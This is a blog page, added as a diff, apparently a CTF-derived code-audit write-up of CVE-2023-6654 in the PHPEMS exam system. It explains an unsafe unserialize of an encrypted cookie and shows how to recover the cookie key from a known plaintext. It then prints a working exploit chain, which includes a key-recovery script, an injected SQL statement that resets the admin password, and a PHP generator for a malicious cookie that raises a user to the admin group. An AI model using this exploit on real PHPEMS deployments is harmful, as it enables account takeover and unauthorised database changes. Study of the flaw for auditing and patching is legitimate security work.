@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta name="description" content="phpems 代码审计学习" />
+    <meta name="hexo-theme-A4" content="v1.8.2" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>v2ish1yan</title>
+
+    
+        
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">v2ish1yan</a> 
+            <span class="description">一切都是兴趣使然</span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            phpems 代码审计学习
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="post-toc-text">漏洞分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B9"><span class="post-toc-text">反序列化点</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0%E7%A0%B4%E8%A7%A3"><span class="post-toc-text">加密函数破解</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="post-toc-text">sql注入</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="post-toc-text">漏洞利用</span></a></li></ol>
+            
+        
+        <blockquote>
+<p>php反序列化导致的sql注入</p>
+<p>西湖论剑赵总出的题，他提交的CVE-2023-6654</p>
+<p>参考文章:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P7akQHPp4saCl16E0Kw4tA">https://mp.weixin.qq.com/s/P7akQHPp4saCl16E0Kw4tA</a></p>
+</blockquote>
+<p>反序列化导致的sql注入我还是第一次见，学习</p>
+<p>路由分析就不写了，自己去看，着重在反序列化和sql注入部分</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h3><p>首先通过调试会发现，每次访问都会执行新建<code>session</code>对象，并执行他的<code>getSessionId()</code>方法</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022108558.png"></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022108178.png" alt="image-20240202210853025"></p>
+<pre><code class="php">public function getSessionId()
+&#123;
+    if(!$this-&gt;sessionid)
+    &#123;
+        $cookie = $this-&gt;strings-&gt;decode($this-&gt;ev-&gt;getCookie($this-&gt;sessionname));//currentuser
+        if($cookie)
+        &#123;
+            $this-&gt;sessionid = $cookie[&#39;sessionid&#39;];
+        &#125;
+    &#125;
+    if(!$this-&gt;sessionid)
+    &#123;
+        $this-&gt;_getOnlySessionid();
+        $this-&gt;setSessionUser(array(&quot;sessionid&quot; =&gt; $this-&gt;sessionid,&#39;sessionip&#39; =&gt; $this-&gt;ev-&gt;getClientIp()));
+    &#125;
+    if(!$this-&gt;getSessionValue())
+    &#123;
+        $this-&gt;setSessionUser(array(&quot;sessionid&quot; =&gt; $this-&gt;sessionid,&#39;sessionip&#39; =&gt; $this-&gt;ev-&gt;getClientIp()));
+    &#125;
+    return $this-&gt;sessionid;
+&#125;
+</code></pre>
+<p>在这里他会调用<code>strings::decode()</code></p>
+<pre><code class="php">public function decode($info)
+&#123;
+    $key = CS;//配置文件的密钥
+    $info = urldecode($info);
+    $kl = strlen($key);
+    $il = strlen($info);
+    for($i = 0; $i &lt; $il; $i++)
+    &#123;
+        $p = $i%$kl;
+        $info[$i] = chr(ord($info[$i])-ord($key[$p]));
+    &#125;
+    $info = unserialize($info);
+    return $info;
+&#125;
+</code></pre>
+<p>这里进行了反序列化操作，也就是漏洞触发点</p>
+<p>这里传入的值就是<code>$this-&gt;ev-&gt;getCookie($this-&gt;sessionname)</code>返回的值，取的是cookie里<code>exam_currentuse</code>的值</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022111383.png" alt="image-20240202211151241"></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022112220.png" alt="image-20240202211226130"></p>
+<p>所以这里的值就是可控的。从<code>decode()</code>可以知道，这个值是经过加密的，我们还需要将需要反序列化的值进行加密操作，再传进<code>decode()</code>进行反序列化</p>
+<h3 id="加密函数破解"><a href="#加密函数破解" class="headerlink" title="加密函数破解"></a>加密函数破解</h3><p>这里的CS的值为配置文件里定义，且我们不知道，所以我们要找方法获得这个key</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022117488.png" alt="image-20240202211714349"></p>
+<p>对比加密和解密函数</p>
+<pre><code class="php">public function encode($info)
+&#123;
+    $info = serialize($info);
+    $key = CS;//配置文件的密钥
+    $kl = strlen($key);
+    $il = strlen($info);
+    for($i = 0; $i &lt; $il; $i++)
+    &#123;
+        $p = $i%$kl;
+        $info[$i] = chr(ord($info[$i])+ord($key[$p]));
+    &#125;
+    return urlencode($info);
+&#125;
+</code></pre>
+<pre><code class="php">public function decode($info)
+&#123;
+    $key = CS;//配置文件的密钥
+    $info = urldecode($info);
+    $kl = strlen($key);
+    $il = strlen($info);
+    for($i = 0; $i &lt; $il; $i++)
+    &#123;
+        $p = $i%$kl;
+        $info[$i] = chr(ord($info[$i])-ord($key[$p]));
+    &#125;
+    $info = unserialize($info);
+    return $info;
+&#125;
+</code></pre>
+<p><code>$key</code>的长度为32，<code>$p</code>的值就是<code>$i%$kl</code>，即取模操作，那么<code>$p</code>的值就为<code>0,1,2,xxx,xxx,xxx,31,0,1,2</code>依次循环，每次循环遍历了32次</p>
+<p>加解密的大致模式为：</p>
+<p>密文字符的ascii <strong>&#x3D;</strong> 明文字符的ascii <strong>+</strong> key字符的ascii，明文字符的ascii <strong>&#x3D;</strong> 密文字符的ascii <strong>-</strong> key字符的ascii</p>
+<p>可以推出：key字符的ascii <strong>&#x3D;</strong> 密文字符的ascii <strong>-</strong> 明文字符的ascii&#96;</p>
+<p>所以只要知道明文和对应的密文，就可以得到key，现在就是要找到可控的密文</p>
+<p>当我们不穿任何cookie进行访问的时候，他会调用这里来生成一个cookie</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022132502.png" alt="image-20240202213214365"></p>
+<pre><code class="php">private function _getOnlySessionid()
+&#123;
+    $code = uniqid($this-&gt;ev-&gt;getClientIp().print_r($_SERVER,true).microtime()).rand(100000,999999);
+    $this-&gt;sessionid = md5($code);
+    if($this-&gt;getSessionValue($this-&gt;sessionid))
+    &#123;
+        $this-&gt;_getOnlySessionid();
+    &#125;
+&#125;
+</code></pre>
+<p>这里是取md5值，所以跟我们无关</p>
+<p>得看<code>$this-&gt;setSessionUser()</code>，跟进<code>$this-&gt;ev-&gt;getClientIp()</code>，可以知道<code>$this-&gt;e[&#39;ip&#39;]</code>的值是可以通过两个header控制的，比如<code>Client-IP</code>和<code>X-Forwarded-For</code>。并将返回值赋值给<code>sessionip</code></p>
+<pre><code class="php">public function getClientIp()
+&#123;
+    if(!isset($this-&gt;e[&#39;ip&#39;]))
+    &#123;
+        if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;))
+            $ip = getenv(&quot;HTTP_CLIENT_IP&quot;);
+        else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;))
+            $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;);
+        else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;))
+            $ip = getenv(&quot;REMOTE_ADDR&quot;);
+        else if (isset($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_SERVER[&#39;REMOTE_ADDR&#39;] &amp;&amp; strcasecmp($_SERVER[&#39;REMOTE_ADDR&#39;], &quot;unknown&quot;))
+            $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
+        else
+            $ip = &quot;unknown&quot;;
+        $this-&gt;e[&#39;ip&#39;] = $ip;
+    &#125;
+    return $this-&gt;e[&#39;ip&#39;];
+&#125;
+</code></pre>
+<p>然后进入这个函数，来设置cookie</p>
+<pre><code class="php">//设置会话用户信息
+public function setSessionUser($args = NULL)
+&#123;
+    if(!$args)return false;
+    else
+    &#123;
+        if(!$args[&#39;sessiontimelimit&#39;])$args[&#39;sessiontimelimit&#39;] = TIME;
+        if(!$this-&gt;sessionid)$this-&gt;getSessionId();
+        $args[&#39;sessionid&#39;] = $this-&gt;sessionid;
+        $args[&#39;sessiontimelimit&#39;] = TIME;
+        $data = array(&#39;session&#39;,array(array(&#39;AND&#39;,&quot;sessionid = :sessionid&quot;,&#39;sessionid&#39;,$this-&gt;sessionid)));
+        $sql = $this-&gt;pdosql-&gt;makeDelete($data);
+        $this-&gt;db-&gt;exec($sql);
+        $data = array(&#39;session&#39;,$args);
+        $sql = $this-&gt;pdosql-&gt;makeInsert($data);
+        $this-&gt;db-&gt;exec($sql);
+        $ck = array(&#39;sessionid&#39;=&gt;$this-&gt;sessionid,&#39;sessionuserid&#39;=&gt;$args[&#39;sessionuserid&#39;],&#39;sessionpassword&#39;=&gt;$args[&#39;sessionpassword&#39;],&#39;sessionip&#39;=&gt;$args[&#39;sessionip&#39;]);
+        $this-&gt;ev-&gt;setCookie($this-&gt;sessionname,$this-&gt;strings-&gt;encode($args),3600*24);
+        return true;
+    &#125;
+&#125;
+</code></pre>
+<p>最后在<code>setCookie()</code>进行最终的操作，将加密后的值赋值给cookie里的<code>exam_currentuser</code></p>
+<pre><code class="php">public function setCookie($name,$value,$time=3600)
+&#123;
+    if($time)$time = TIME + $time;
+    else $time = 0;
+    if(CDO)setCookie(CH.$name,$value,$time,CP,CDO,false,TRUE);
+    else setCookie(CH.$name,$value,$time,CP,&#39;&#39;,false,TRUE);
+&#125;
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022143734.png" alt="image-20240202214306583"></p>
+<p>当我们设置<code>Client-IP: 127.0.0.1</code>header的时候，就可以看到<code>sessionip</code>的值为<code>127.0.0.1</code></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022145041.png" alt="image-20240202214547950"></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022144488.png" alt="image-20240202214416346"></p>
+<p>这里就是我们可以控制的密文部分了，其明文的为</p>
+<pre><code>a:3:&#123;s:9:&quot;sessionid&quot;;s:32:&quot;f5316b94fc79a4a0a1095f1b6b105e7d&quot;;s:9:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:16:&quot;sessiontimelimit&quot;;i:1706881593;&#125;
+</code></pre>
+<p>总共131个字符，其密文也应该是131个字符</p>
+<p>为了获取到32位的key，我们需要让我们可以控制、预测的密文长度至少为32。</p>
+<p>在这里可以取的范围为<code>&quot;;s:9:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:16:&quot;sessiontimelimit&quot;;i:</code>，这里的长度是60</p>
+<p>最后为了获取完整的key，要么是找到可以整除32的起点，要么是找到重复字符串，自己去首尾拼接。我这里为了方便，选择第一种方法。</p>
+<pre><code class="php">substr($明文,64,32)
+//:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:
+</code></pre>
+<p>先带header，不带cookie去访问目标网站获取密文</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022200598.png" alt="image-20240202220008509"></p>
+<p>然后利用密文和我们调式出来的明文获取key</p>
+<p>解密脚本</p>
+<pre><code class="php">&lt;?php
+$enc=&quot;%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2598np%2595%25C5m%2595k%259C%2596%25C8g%259Bf%25C9%259D%2593%25C6%2597jb%2597%2591%2560j%25C4o%25C5dh%2594a%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Dmk%2599%2594f%259D%25B0&quot;;
+$enc_r=urldecode($enc);
+$enc_r=urldecode($enc_r);
+$enc_r=substr($enc_r,64,32);
+function getkey($a,$b)
+&#123;
+    $key=&quot;&quot;;
+    $info=$a;
+    $kl = 32;
+    $il = strlen($a);
+    for($i = 0; $i &lt; $il; $i++)
+    &#123;
+        $p = $i%$kl;
+        $key.= chr(ord($info[$i])-ord($b[$p]));
+    &#125;
+    print_r($key);
+&#125;
+
+getkey($enc_r,&#39;:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:1&#39;);
+</code></pre>
+<p>得到key为<code>4b394f264dfcdc724a06b9b05c1e59ed</code></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022201239.png" alt="image-20240202220133099"></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>反序列化能打的点只有一个，因为这套源码没有使用自动类加载</p>
+<p>就是<code>session</code>类的<code>__destruct()</code>函数，通过更改<code>pdosql</code>对象的属性，进行sql注入</p>
+<pre><code>session::__destruct()-&gt;pdosql::makeUpdate()-&gt;pepdo::exec()
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022204419.png" alt="image-20240202220435313"></p>
+<p>具体更改的地方就是<code>pdosql</code>对象的<code>tablepre</code>属性</p>
+<pre><code class="php">//生成update sql
+public function makeUpdate($args,$tablepre = NULL)
+&#123;
+    if(!is_array($args))return false;
+    if($tablepre === NULL)$tb_pre = $this-&gt;tablepre;
+    else $tb_pre = $tablepre;
+    $tables = $args[0];
+    $args[1] = $this-&gt;_makeDefaultUpdateArgs($tables,$args[1]);
+    if(is_array($tables))
+    &#123;
+        $db_tables = array();
+        foreach($tables as $p)
+        &#123;
+            $db_tables[] = &quot;&#123;$tb_pre&#125;&#123;$p&#125; AS $p&quot;;
+        &#125;
+        $db_tables = implode(&#39;,&#39;,$db_tables);
+    &#125;
+    else
+        $db_tables = $tb_pre.$tables;
+    $v = array();
+
+    $pars = $args[1];
+    if(!is_array($pars))return false;
+    $parsql = array();
+    foreach($pars as $key =&gt; $value)
+    &#123;
+        $parsql[] = $key.&#39; = &#39;.&#39;:&#39;.$key;
+        if(is_array($value))$value = serialize($value);
+        $v[$key] = $value;
+    &#125;
+    $parsql = implode(&#39;,&#39;,$parsql);
+
+    $query = $args[2];
+    if(!is_array($query))$db_query = 1;
+    else
+    &#123;
+        $q = array();
+        foreach($query as $p)
+        &#123;
+            $q[] = $p[0].&#39; &#39;.$p[1].&#39; &#39;;
+            if(isset($p[2]))
+                $v[$p[2]] = $p[3];
+        &#125;
+        $db_query = &#39;1 &#39;.implode(&#39; &#39;,$q);
+    &#125;
+    if(isset($args[3]))
+        $db_groups = is_array($args[3])?implode(&#39;,&#39;,$args[3]):$args[3];
+    else
+        $db_groups = &#39;&#39;;
+    if(isset($args[4]))
+        $db_orders = is_array($args[4])?implode(&#39;,&#39;,$args[4]):$args[4];
+    else
+        $db_orders = &#39;&#39;;
+    if(isset($args[5]))
+        $db_limits = is_array($args[5])?implode(&#39;,&#39;,$args[5]):$args[5];
+    else
+        $db_limits = &#39;&#39;;
+    if($db_limits == false &amp;&amp; $db_limits !== false)$db_limits = $this-&gt;_mostlimits;
+    $db_groups = $db_groups?&#39; GROUP BY &#39;.$db_groups:&#39;&#39;;
+    $db_orders = $db_orders?&#39; ORDER BY &#39;.$db_orders:&#39;&#39;;
+    $sql = &#39;UPDATE &#39;.$db_tables.&#39; SET &#39;.$parsql.&#39; WHERE &#39;.$db_query.$db_groups.$db_orders.&#39; LIMIT &#39;.$db_limits;
+    return array(&#39;sql&#39; =&gt; $sql, &#39;v&#39; =&gt; $v);
+&#125;
+</code></pre>
+<p>取<code>$this-&gt;tablepre</code>的值，然后拼接为<code>$db_tables</code></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022210687.png" alt="image-20240202221040641"></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022209373.png" alt="image-20240202220937285"></p>
+<p>最后拼接为sql语句</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022212027.png" alt="image-20240202221228984"></p>
+<pre><code class="sql">UPDATE x2_session SET sessionlasttime = :sessionlasttime WHERE 1 AND sessionid = :sessionid  LIMIT 512
+</code></pre>
+<p>这里面的<code>x2_</code>是可控的，所以我们可以构造sql语句来修改管理员密码或者修改用户的权限，然后利用<code>#</code>或者<code>+ --qwe</code>来注释后面的sql语句</p>
+<p>通过查看注册代码，可以知道这里的密码是经过md5加密</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022214617.png" alt="image-20240202221445574"></p>
+<p>所以设置<code>$this-&gt;tablepre</code>的值为</p>
+<pre><code>x2_user SET userpassword = &#39;e10adc3949ba59abbe56e057f20f883e&#39; WHERE userid = 1  #
+</code></pre>
+<p>最后得到拼接的sql语句为</p>
+<pre><code class="sql">UPDATE x2_user SET userpassword = &#39;e10adc3949ba59abbe56e057f20f883e&#39; WHERE userid = 1  #session SET  WHERE 1 AND sessionid = :sessionid  LIMIT 512
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022216453.png" alt="image-20240202221639407"></p>
+<p>进入到后面的<code>exec()</code>里，因为预编译的值都被注释了，所以不会影响sql语句的执行</p>
+<p>执行成功</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022218657.png" alt="image-20240202221816614"></p>
+<p>看表里也被修改了</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022218439.png" alt="image-20240202221844373"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在构造序列化的时候，需要注意添加到一个数组里，否则在执行到这里的时候，会报错，导致无法进入<code>__destruct()</code>方法里</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022221783.png" alt="image-20240202222121705"></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022221035.png" alt="image-20240202222131934"></p>
+<p>通过修改用户权限的方式</p>
+<pre><code class="php">&lt;?php
+namespace PHPEMS&#123;
+
+    class pdosql&#123;
+        public $tablepre = &quot;x2_user SET usergroupid = 1 WHERE username = &#39;v2ish1yan&#39;  #&quot;;
+        public function __construct()&#123;
+            $this-&gt;db=new pepdo();
+        &#125;
+    &#125;
+
+    class pepdo
+    &#123;
+
+    &#125;
+    class session&#123;
+        public function __construct()&#123;
+            $this-&gt;pdosql=new \PHPEMS\pdosql();
+            $this-&gt;db=new \PHPEMS\pepdo();
+        &#125;
+    &#125;
+
+&#125;
+
+namespace &#123;
+    function encode($info)
+    &#123;
+        $info = serialize($info);
+        $key = &quot;4b394f264dfcdc724a06b9b05c1e59ed&quot;;
+        $kl = strlen($key);
+        $il = strlen($info);
+        for($i = 0; $i &lt; $il; $i++)
+        &#123;
+            $p = $i%$kl;
+            $info[$i] = chr(ord($info[$i])+ord($key[$p]));
+        &#125;
+        return urlencode($info);
+    &#125;
+    $a=new PHPEMS\session();
+    $arr=array(&quot;sessionid&quot;=&gt;&quot;213&quot;,$a);
+    echo urlencode(encode($arr));
+&#125;
+</code></pre>
+<p>将得到的值设置为<code>exam_currentuser</code>，带着这个cookie访问网站</p>
+<p>成功修改权限，登录后台</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022232625.png" alt="image-20240202223224547"></p>
+
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-02-02</span>
+            
+                <span>该篇文章被 v2ish1yan</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/php/'>
+                            php
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+                            代码审计
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+   
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
